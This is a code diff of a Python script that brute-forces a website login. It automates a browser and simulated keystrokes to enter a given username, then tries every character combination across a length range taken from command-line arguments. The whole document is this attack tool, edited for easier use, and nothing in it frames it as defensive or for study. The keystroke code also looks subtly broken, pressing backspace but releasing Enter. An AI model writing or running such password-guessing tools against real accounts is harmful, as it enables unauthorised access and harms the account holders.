@@ -1,23 +1,24 @@
 from webbot import Browser
 from pynput.keyboard import Key, Controller
 import time
+import sys
 from itertools import product
 
 def parseStringToArray(str):
+    print(str)
     for i in str:
+        print(i)
         bruteforce.append(i)
 
-username = input('Username: ')
-min = int(input("Min: "))
-maxx = int(input("Max: "))
-ch = []
-bruteforce = []
+params = sys.argv
+print(params)
+username = params[1]
+min = int(params[2])
+maxx = int(params[3])
 
-file = open(f'chars.txt', 'r')
-for line in file:
-    line = line.strip()
-    ch.append(line)
-parseStringToArray(ch[0])
+bruteforce = []
+chars_list = params[4]
+parseStringToArray(chars_list)
 
 web = Browser()
 keyboard = Controller()
@@ -34,7 +35,6 @@ web.type(username, into="username")
 keyboard.press(Key.tab)
 keyboard.release(Key.tab)
 caracteres = bruteforce
-print(caracteres)
 minn = min
 while minn <= maxx:
     genComb = product(caracteres, repeat=minn)
@@ -43,6 +43,6 @@ while minn <= maxx:
         keyboard.press(Key.enter)
         keyboard.release(Key.enter)
         for x in range(minn):
-            keyboard.press(Key.enter)
+            keyboard.press(Key.backspace)
             keyboard.release(Key.enter)
     minn += 1
